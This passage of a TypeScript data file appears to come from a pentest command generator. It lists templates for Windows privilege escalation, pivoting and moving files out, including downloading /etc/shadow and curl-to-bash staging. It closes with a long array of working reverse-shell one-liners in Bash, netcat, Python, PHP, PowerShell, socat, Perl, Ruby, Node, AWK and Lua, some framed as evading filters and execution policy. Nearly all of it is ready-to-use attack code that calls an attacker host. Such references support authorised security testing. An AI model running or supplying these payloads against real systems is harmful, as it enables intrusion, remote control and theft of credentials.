    tags: ['godpotato', 'seimpersonate', 'potato', 'privesc'],
    platform: 'Windows'
  },
  {
    id: 'printspoofer-privesc',
    title: 'PrintSpoofer SeImpersonate / Named Pipe Exploit',
    category: 'active-directory',
    description: 'Elevate from service account to SYSTEM via print spooler named pipe reflection.',
    commandTemplate: 'PrintSpoofer64.exe -i -c cmd',
    tags: ['printspoofer', 'seimpersonate', 'named-pipe', 'privesc'],
    platform: 'Windows'
  },

  // =================== ADDITIONAL PIVOTING & LATERAL MOVEMENT ===================
  {
    id: 'proxychains-nmap',
    title: 'Proxychains TCP Full Connect Nmap Scan',
    category: 'pivoting',
    description: 'Route Nmap port scan through SOCKS proxy tunnel to scan internal networks.',
    commandTemplate: 'proxychains4 -q nmap -sT -Pn -p 21,22,80,445,3389,8080 172.16.1.10',
    tags: ['proxychains', 'pivot', 'nmap', 'socks'],
    platform: 'Both'
  },
  {
    id: 'netsh-portproxy',
    title: 'Netsh Native Windows Port Forwarding',
    category: 'pivoting',
    description: 'Forward incoming traffic on Windows host to another internal machine without extra binaries.',
    commandTemplate: 'netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.1.50',
    tags: ['netsh', 'portproxy', 'pivot', 'windows'],
    platform: 'Windows'
  },
  {
    id: 'ssh-reverse-forward',
    title: 'SSH Reverse Remote Forwarding (-R)',
    category: 'pivoting',
    description: 'Expose local port or listener on compromised host back to attacker machine.',
    commandTemplate: 'ssh -R {LPORT}:127.0.0.1:80 {USER}@{LHOST} -N',
    tags: ['ssh', 'reverse-forward', 'tunnel', 'pivot'],
    platform: 'Both'
  },

  // =================== ADDITIONAL FILE TRANSFERS ===================
  {
    id: 'base64-transfer-linux',
    title: 'Base64 Binary Pipe (Linux)',
    category: 'file-transfer',
    description: 'Encode binary file into single-line Base64 string for copy-pasting over low-priv shell.',
    commandTemplate: 'cat file.bin | base64 -w 0',
    tags: ['base64', 'transfer', 'linux'],
    platform: 'Linux'
  },
  {
    id: 'base64-decode-windows',
    title: 'Base64 Binary Reconstruct (Windows PowerShell)',
    category: 'file-transfer',
    description: 'Reconstruct Base64 string back into executable binary on target Windows machine.',
    commandTemplate: '[IO.File]::WriteAllBytes("C:\\Temp\\tool.exe", [Convert]::FromBase64String("BASE64_STRING"))',
    tags: ['base64', 'powershell', 'transfer', 'windows'],
    platform: 'Windows'
  },
  {
    id: 'smb-netuse',
    title: 'SMB Share Drive Mount & Copy (Windows)',
    category: 'file-transfer',
    description: 'Mount remote attacker SMB share as network drive letter and copy tools.',
    commandTemplate: 'net use Z: \\\\{LHOST}\\share /user:guest "" && copy Z:\\tool.exe C:\\Temp\\tool.exe',
    tags: ['smb', 'net-use', 'transfer', 'windows'],
    platform: 'Windows'
  },
  {
    id: 'scp-download',
    title: 'SCP Secure File Download from Remote Target',
    category: 'file-transfer',
    description: 'Download looted databases or shadow files from compromised host over SSH.',
    commandTemplate: 'scp -P 22 {USER}@{TARGET_IP}:/etc/shadow ./loot_shadow.txt',
    tags: ['scp', 'ssh', 'loot', 'download'],
    platform: 'Both'
  },
  {
    id: 'netcat-file-send',
    title: 'Netcat Raw TCP File Stream',
    category: 'file-transfer',
    description: 'Stream files or directory tarballs over raw TCP socket between hosts.',
    commandTemplate: '# On Receiver:\nnc -lvnp 9001 > loot.tar.gz\n\n# On Sender:\nnc {LHOST} 9001 < loot.tar.gz',
    tags: ['netcat', 'stream', 'transfer'],
    platform: 'Both'
  },
  {
    id: 'curl-bash-oneliner',
    title: 'cURL to Bash In-Memory Execution',
    category: 'file-transfer',
    description: 'Download and pipe shell scripts straight into memory without touching disk.',
    commandTemplate: 'curl -sSL http://{LHOST}:8000/script.sh | bash',
    tags: ['curl', 'bash', 'stager', 'in-memory'],
    platform: 'Linux'
  }
];

// Dedicated Reverse Shell generator templates
export interface ReverseShellTemplate {
  name: string;
  language: string;
  platform: 'Linux' | 'Windows' | 'Both';
  command: string;
  notes?: string;
  listener: string;
}

export const REVERSE_SHELL_TEMPLATES: ReverseShellTemplate[] = [
  // --- BASH & SH ---
  {
    name: 'Bash -i Interactive',
    language: 'Bash',
    platform: 'Linux',
    command: '{shell} -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Classic standard interactive bash reverse shell. Works on 95% of Linux targets.'
  },
  {
    name: 'Bash 196 File Descriptor',
    language: 'Bash',
    platform: 'Linux',
    command: '0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; {shell} <&196 >&196 2>&196',
    listener: 'nc -lvnp {LPORT}',
    notes: 'File descriptor 196 redirection that bypasses simple command string filters.'
  },
  {
    name: 'Bash Read Line Loop',
    language: 'Bash',
    platform: 'Linux',
    command: 'exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Pure bash line-by-line read execution loop without interactive flag.'
  },
  {
    name: 'Bash 5 Descriptor',
    language: 'Bash',
    platform: 'Linux',
    command: '{shell} -i 5<> /dev/tcp/{LHOST}/{LPORT} 0<&5 1>&5 2>&5',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Assigns descriptor 5 for bidirectional socket I/O.'
  },
  {
    name: 'Bash UDP Socket',
    language: 'Bash',
    platform: 'Linux',
    command: '{shell} -i >& /dev/udp/{LHOST}/{LPORT} 0>&1',
    listener: 'nc -u -lvnp {LPORT}',
    notes: 'UDP-based reverse shell to bypass TCP-only outbound firewall egress restrictions.'
  },

  // --- NETCAT & NCAT ---
  {
    name: 'Netcat Traditional (-e)',
    language: 'Netcat',
    platform: 'Linux',
    command: 'nc -e {shell} {LHOST} {LPORT}',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Requires netcat-traditional with -e flag compiled.'
  },
  {
    name: 'Netcat OpenBSD FIFO (mkfifo)',
    language: 'Netcat',
    platform: 'Linux',
    command: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {LHOST} {LPORT} >/tmp/f',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Works on Ubuntu/Debian default netcat-openbsd where -e is stripped.'
  },
  {
    name: 'Netcat -c Flag',
    language: 'Netcat',
    platform: 'Linux',
    command: 'nc -c {shell} {LHOST} {LPORT}',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Uses netcat -c option to spawn shell on connect.'
  },
  {
    name: 'Netcat Windows (nc.exe)',
    language: 'Netcat',
    platform: 'Windows',
    command: 'nc.exe {LHOST} {LPORT} -e {shell}',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Standard Windows netcat one-liner.'
  },
  {
    name: 'BusyBox nc -e',
    language: 'Netcat',
    platform: 'Linux',
    command: 'busybox nc {LHOST} {LPORT} -e {shell}',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Great for embedded Linux, IoT, and minimal containerized environments.'
  },
  {
    name: 'Ncat -e (nmap suite)',
    language: 'Ncat',
    platform: 'Linux',
    command: 'ncat {LHOST} {LPORT} -e {shell}',
    listener: 'ncat -lvnp {LPORT}',
    notes: 'Reliable ncat reverse shell from Nmap project.'
  },
  {
    name: 'Ncat.exe Windows',
    language: 'Ncat',
    platform: 'Windows',
    command: 'ncat.exe {LHOST} {LPORT} -e {shell}',
    listener: 'ncat -lvnp {LPORT}',
    notes: 'Windows binary Ncat execution.'
  },
  {
    name: 'Ncat UDP Socket',
    language: 'Ncat',
    platform: 'Linux',
    command: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|ncat -u {LHOST} {LPORT} >/tmp/f',
    listener: 'ncat -u -lvnp {LPORT}',
    notes: 'Ncat over UDP protocol for restrictive firewall egress.'
  },

  // --- CURL & TELNET ---
  {
    name: 'cURL Telnet Shell',
    language: 'cURL',
    platform: 'Linux',
    command: 'C=\'curl -Ns telnet://{LHOST}:{LPORT}\'; $C </dev/null 2>&1 | {shell} 2>&1 | $C >/dev/null',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Leverages cURL telnet protocol support when other network utilities are absent.'
  },
  {
    name: 'Rustcat Reverse',
    language: 'Rustcat',
    platform: 'Linux',
    command: 'rcat {LHOST} {LPORT} -r {shell}',
    listener: 'rcat -lp {LPORT}',
    notes: 'Fast and reliable Rust-based reverse shell.'
  },

  // --- PYTHON ---
  {
    name: 'Python 3 Socket & PTY Spawn',
    language: 'Python',
    platform: 'Both',
    command: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("{shell}")\'',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Directly allocates pseudo-terminal (PTY) inside socket for instant interactive job control.'
  },
  {
    name: 'Python 3 Short One-Liner',
    language: 'Python',
    platform: 'Linux',
    command: 'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("{LHOST}",{LPORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("{shell}")\'',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Ultra-condensed Python 3 one-liner suitable for injection payloads.'
  },
  {
    name: 'Python Windows cmd.exe Spawner',
    language: 'Python',
    platform: 'Windows',
    command: 'python.exe -c "import socket,os,threading,subprocess as sp;p=sp.Popen([\'{shell}\'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect((\'{LHOST}\',{LPORT}));threading.Thread(target=sp.copyfileobj,args=(p.stdout,s)).start();sp.copyfileobj(s,p.stdin)"',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Spawns cmd.exe/powershell pipe on Windows targets with Python installed.'
  },

  // --- PHP ---
  {
    name: 'PHP PentestMonkey Socket',
    language: 'PHP',
    platform: 'Linux',
    command: 'php -r \'$sock=fsockopen("{LHOST}",{LPORT});exec("{shell} -i <&3 >&3 2>&3");\'',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Classic pentestmonkey one-line PHP reverse shell.'
  },
  {
    name: 'PHP Ivan Sincek proc_open',
    language: 'PHP',
    platform: 'Both',
    command: 'php -r \'$sock=fsockopen("{LHOST}",{LPORT});$proc=proc_open("{shell}", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);\'',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Uses proc_open descriptor mapping for reliable PHP shell across Unix & Windows.'
  },
  {
    name: 'PHP popen / cmd',
    language: 'PHP',
    platform: 'Linux',
    command: 'php -r \'$sock=fsockopen("{LHOST}",{LPORT});popen("{shell} <&3 >&3 2>&3", "r");\'',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Uses popen when exec() is disabled in php.ini disable_functions.'
  },
  {
    name: 'PHP system() Fallback',
    language: 'PHP',
    platform: 'Linux',
    command: 'php -r \'$sock=fsockopen("{LHOST}",{LPORT});system("{shell} <&3 >&3 2>&3");\'',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Fallback to system() when exec() is blocked.'
  },

  // --- POWERSHELL & WINDOWS ---
  {
    name: 'PowerShell TCP Client Interactive',
    language: 'PowerShell',
    platform: 'Windows',
    command: 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{LHOST}\',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Native PowerShell TCP client with interactive PS prompt output.'
  },
  {
    name: 'PowerShell Hidden Bypass (-e)',
    language: 'PowerShell',
    platform: 'Windows',
    command: 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient(\'{LHOST}\',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Clean execution flags to bypass ExecutionPolicy and stay hidden.'
  },
  {
    name: 'Windows ConPty Interactive TTY Shell',
    language: 'PowerShell',
    platform: 'Windows',
    command: 'IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {LHOST} {LPORT}',
    listener: 'stty raw -echo; (stty size; cat) | nc -lvnp {LPORT}',
    notes: 'Fully functional Windows PTY shell with colors, tab completion, and Ctrl+C support via ConPty.'
  },

  // --- SOCAT ---
  {
    name: 'Socat Interactive TTY Shell',
    language: 'Socat',
    platform: 'Linux',
    command: 'socat TCP:{LHOST}:{LPORT} EXEC:\'{shell} -li\',pty,stderr,setsid,sigint,sane',
    listener: 'socat file:`tty`,raw,echo=0 TCP-L:{LPORT}',
    notes: 'Instantly provides a fully functional raw TTY shell with terminal size and Ctrl+C support!'
  },
  {
    name: 'Socat Standard TCP Exec',
    language: 'Socat',
    platform: 'Linux',
    command: 'socat TCP:{LHOST}:{LPORT} EXEC:{shell}',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Lightweight socat shell without raw tty handler.'
  },

  // --- PERL & RUBY ---
  {
    name: 'Perl Socket Shell',
    language: 'Perl',
    platform: 'Linux',
    command: 'perl -e \'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell} -i");};\'',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Dependable Perl socket connect-back.'
  },
  {
    name: 'Ruby TCPSocket',
    language: 'Ruby',
    platform: 'Linux',
    command: 'ruby -rsocket -e\'f=TCPSocket.open("{LHOST}",{LPORT}).to_i;exec sprintf("{shell} -i <&%d >&%d 2>&%d",f,f,f)\'',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Useful on systems where Ruby or Metasploit/Chef is installed.'
  },

  // --- NODEJS, JAVA, AWK, LUA ---
  {
    name: 'NodeJS Child Process Spawn',
    language: 'NodeJS',
    platform: 'Both',
    command: 'node -e \'const net = require("net");const { spawn } = require("child_process");const client = new net.Socket();client.connect({LPORT}, "{LHOST}", () => {const sh = spawn("{shell}", []);client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});\'',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Great for Node.js / Express web applications with command injection or desync.'
  },
  {
    name: 'Java Runtime Exec',
    language: 'Java',
    platform: 'Both',
    command: 'java -e \'r = Runtime.getRuntime(); p = r.exec(["{shell}","-c","exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]); p.waitFor()\'',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Java process spawner for Tomcat, JBoss, Jenkins, and Java deserialization exploits.'
  },
  {
    name: 'AWK TCP Connect-Back',
    language: 'AWK',
    platform: 'Linux',
    command: 'awk \'BEGIN {s = "/inet/tcp/0/{LHOST}/{LPORT}"; while (42) { do{ printf "shell>" |& s; s |& getline c; if (c) { while ((c |& getline) > 0) print $0 |& s; close(c); } } while (c != "exit") close(s); }}\' /dev/null',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Leverages GNU AWK built-in networking capabilities (/inet/tcp).'
  },
  {
    name: 'Lua Socket Shell',
    language: 'Lua',
    platform: 'Linux',
    command: 'lua -e "local s=require(\'socket\');local t=assert(s.tcp());t:connect(\'{LHOST}\',{LPORT});while true do local r,x=t:receive();local f=assert(io.popen(r,\'r\'));local b=assert(f:read(\'*a\'));t:send(b);end"',
    listener: 'nc -lvnp {LPORT}',
    notes: 'Lua socket reverse shell for Redis, Nginx Lua, or game servers.'
  }
];
